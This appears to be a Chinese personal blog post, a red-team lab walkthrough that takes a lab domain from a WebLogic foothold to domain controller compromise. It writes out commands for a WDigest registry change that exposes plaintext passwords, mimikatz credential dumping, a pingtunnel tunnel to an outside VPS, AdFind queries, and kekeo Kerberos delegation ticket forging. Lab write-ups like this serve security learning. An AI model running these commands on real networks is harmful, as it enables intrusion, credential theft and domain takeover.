@@ -1,0 +1,132 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="渗透红队靶场2.0"><meta name="keywords" content="靶场,红队"><meta name="author" content="东雲"><meta name="copyright" content="东雲"><title>渗透红队靶场2.0 | 东雲研究所</title><link rel="shortcut icon" href="/melody-favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '6.2.0'
+} </script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="东雲研究所" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">靶场环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-x2F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">WEB&#x2F;信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bind-tcp%E6%89%93win7%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="toc-number">3.</span> <span class="toc-text">bind_tcp打win7不出网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E8%AE%BF%E9%97%AEmssql"><span class="toc-number">4.</span> <span class="toc-text">代理隧道访问mssql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">委派约束攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">学习总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">东雲</div><div class="author-info__description text-center">想学渗透的学生一枚</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/ElectQ">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">6</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">6</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">3</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://w.wallhaven.cc/full/1k/wallhaven-1keo6g.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">东雲研究所</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">首页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">渗透红队靶场2.0</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-03</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h2><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/1636704314_618e203aed9c3a0ec73e7.png!small" alt="img"></p>
+<span id="more"></span>
+
+<h2 id="WEB-x2F-信息收集"><a href="#WEB-x2F-信息收集" class="headerlink" title="WEB&#x2F;信息收集"></a>WEB&#x2F;信息收集</h2><p>端口探测</p>
+<p>nmap -v -Pn -T4 -sV -n -sT –open -p 22,1222,2222,22345,23,21,80,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,7002,389,902,1194,1080,88,69,2049,389,5632,8080,8089,9090,4848,1352,10000,27017,27018,25,110,143,67,68,161,2181,8069,9200,9300,11211,512,513,514,873,3690,50000 192.168.72.133  </p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220420220200519.png" alt="image-20220420220200519"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.72.133:7001/console">http://192.168.72.133:7001/console</a></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220420220853360.png" alt="image-20220420220853360"></p>
+<p>版本12.1.3.0.0推测存在Weblogic IIOP协议反序列化漏洞（CVE-2020-2551）</p>
+<p>利用powershell执行命令上线CS</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220420230539681.png" alt="image-20220420230539681"></p>
+<p>发现是双网卡</p>
+<p>在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码,可以通过修改注册表强制锁屏让Wdigest Auth保存明文口令</p>
+<p>修改注册表为1启用<br>shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>强制锁屏<br>shell “rundll32 user32.dll,LockWorkStation”</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220421201927330.png" alt="image-20220421201927330"></p>
+<p>当管理员再次输入密码登录账户时，就能可以通过logonpasswords 获取明文密码</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220421202433832.png" alt="image-20220421202433832"></p>
+<p>有了管理员用户就可以尝试RDP登录</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220421210703742.png" alt="image-20220421210703742"></p>
+<p>查看防火墙规则看到了这条</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422000435191.png" alt="image-20220422000435191"></p>
+<p>搭建pingtunnel服务器等待客户端连接</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422003419498.png" alt="image-20220422003419498"></p>
+<p>将6666端口流量转发到kali的6666端口实现代理连接可以访问内部网段</p>
+<p>socks 6666</p>
+<p>shell pingtunnel.exe -type client -l :6666 -s 117.50.179.15 -sock5 1 -nolog 1</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422125206067.png" alt="image-20220422125206067"></p>
+<p>这里windows的远程桌面连接报个了数据加密的错，需要修改一下本地策略</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422125320431.png" alt="image-20220422125320431"></p>
+<p>windows proxifier代理工具远程连接主机</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220422125038628.png" alt="image-20220422125038628"></p>
+<p>将会话传递给msf</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220430221005057.png" alt="image-20220430221005057"></p>
+<p>收集网络信息并且添加路由</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424084357311.png" alt="image-20220424084357311"></p>
+<p>上传fscan64.exe扫描内网网段发现win7存在永恒之蓝漏洞</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220430220818025.png" alt="image-20220430220818025"></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424090857613.png" alt="image-20220424090857613"></p>
+<p>永恒之蓝直接getsystem</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424094328523.png" alt="image-20220424094328523"></p>
+<p>load mimikatz抓取域用户密码</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424111520068.png" alt="image-20220424111520068"></p>
+<p>开启RDP远程连接</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424180451388.png" alt="image-20220424180451388"></p>
+<p>查询ip信息</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424161219708.png" alt="image-20220424161219708"></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424165417056.png" alt="image-20220424165417056"></p>
+<p>获取更多的凭证</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424170550584.png" alt="image-20220424170550584"></p>
+<p>管理员才有权限能远程登录</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424180837972.png" alt="image-20220424180837972"></p>
+<p>容量小的软件就可以直接用upload上传</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220424181229399.png" alt="image-20220424181229399"></p>
+<h2 id="bind-tcp打win7不出网"><a href="#bind-tcp打win7不出网" class="headerlink" title="bind_tcp打win7不出网"></a>bind_tcp打win7不出网</h2><p>靶机主动连接跳板机需要修改防火墙的入站规则,如果不修改防火墙策略的话，针对对方主机不出网的特点，我们就可以采用bind连接方式，上传一个被动连接的木马(前提是你已经有一个msf会话)到win7上再用跳板机的会话去连接它</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501104312926.png" alt="image-20220501104312926"></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501104238704.png" alt="image-20220501104238704"></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501232405342.png" alt="image-20220501232405342"></p>
+<p>当前是普通用户权限</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501232158302.png" alt="image-20220501232158302"></p>
+<p>查看系统信息</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220501232044317.png" alt="image-20220501232044317"></p>
+<p>MS14-068域提权的补丁编号KB3011780这里没有，可以尝试打一下,但是一直没回显(不知道是对方主机不出网的原因还是插件的原因)</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502000855766.png" alt="image-20220502000855766"></p>
+<p>查看域控信息,因为CS那边提权老是不成功所以win7的后渗透信息收集还是交给msf来做</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502210148422.png" alt="image-20220502210148422"></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502210834276.png" alt="image-20220502210834276"></p>
+<p>被禁止获取域控的信息,只知道域名是REDTEAM,域内就三台主机排除也是很快的</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502211150249.png" alt="image-20220502211150249"></p>
+<p>还是上传fscan64.exe对内网段进行扫描，发现这里10.10.10.18主机存在mysql弱口令</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502212817923.png" alt="image-20220502212817923"></p>
+<p>上传AdFind用于寻找域内委派用户,没想到也可以直接找到域控信息</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502213610535.png" alt="image-20220502213610535"></p>
+<p>查询域中配置非约束委派的服务账户</p>
+<p><code>AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></p>
+<p>可以得知sqlserver服务器上存在一个委派用户</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220502214817911.png" alt="image-20220502214817911"></p>
+<h2 id="代理隧道访问mssql"><a href="#代理隧道访问mssql" class="headerlink" title="代理隧道访问mssql"></a>代理隧道访问mssql</h2><p>本地9999端口启用sock代理</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503095014907.png" alt="image-20220503095014907"></p>
+<p>将10.10.20.7的9999端口sockd代理转发到web主机的1090端口</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503100010062.png" alt="image-20220503100010062"></p>
+<p>因为使用lcx_tran不成功这里换成msf来做端口转发,CS命令不会就是这样了</p>
+<p>(10.10.20.7:9999&lt;–&gt;10.10.20.12:1090)</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101342609.png" alt="image-20220503101342609"></p>
+<p>同理使用pingtunnel将socks5端口转发至VPS</p>
+<p>(VPS:1090 &lt;—&gt; 192.168.72.133:1090)</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101412703.png" alt="image-20220503101412703"></p>
+<p>使用代理远程连接mssql数据库(Proxifier是个好东西)</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101633367.png" alt="image-20220503101633367"></p>
+<p>查看权限只是个服务权限</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503101855226.png" alt="image-20220503101855226"></p>
+<p>使用SharpSQLTools进行提权（但是这个权限没有转移到msf和cs上去,不懂）</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503104507380.png" alt="image-20220503104507380"></p>
+<p>由于cs的win7beacon上不回显，先使用msf先拿到一个低权限用户</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503111019797.png" alt="image-20220503111019797"></p>
+<p>烂土豆（MS16-075）令牌窃取</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503115024286.png" alt="image-20220503115024286"></p>
+<p>上传木马上线CS</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503112012028.png" alt="image-20220503112012028"></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503120156852.png" alt="image-20220503120156852"></p>
+<h2 id="委派约束攻击"><a href="#委派约束攻击" class="headerlink" title="委派约束攻击"></a>委派约束攻击</h2><p>利用kekeo请求该用户的TGT</p>
+<p><code>kekeo.exe &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot;</code></p>
+<p>然后使用这张TGT拿到域控的ST</p>
+<p><code>kekeo.exe &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</code></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503205305391.png" alt="image-20220503205305391"></p>
+<p>将票据载入内存</p>
+<p><code>mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</code></p>
+<p>这里CS不回显让我以为失败了(恼！！)</p>
+<p>然后我们就拥有域控的权限</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503214905876.png" alt="image-20220503214905876"></p>
+<p>flag在域控桌面上</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220503215241118.png" alt="image-20220503215241118"></p>
+<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>1.体积较大的文件还是用RDP传输不然msf的session容易die</p>
+<p>2.msf的永恒之蓝exp只能打一次上线后最好及时留个后门</p>
+<p>3.防火墙规则对出站进行限制的话可以采用正向连接的方式</p>
+<p>4.代理中cs自带的sock4a代理和ew的sock5是不兼容的，版本不同是不能通信的</p>
+<p>由于本人刚刚学习内网这块，还是有很多细节问题不能有效解决，希望能在未来深入学习中得到解答</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">东雲</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://electq.github.io/2022/06/03/渗透红队靶场2-0/">http://electq.github.io/2022/06/03/渗透红队靶场2-0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://ElectQ.github.io">东雲研究所</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/06/04/%E6%96%97%E5%9C%B0%E4%B8%BB%E6%B8%B8%E6%88%8F/"><i class="fa fa-chevron-left">  </i><span>斗地主游戏</span></a></div><div class="next-post pull-right"><a href="/2022/06/03/vulnhub-zeus/"><span>vulnhub-zeus</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://w.wallhaven.cc/full/1k/wallhaven-1keo6g.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2022 By 东雲</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
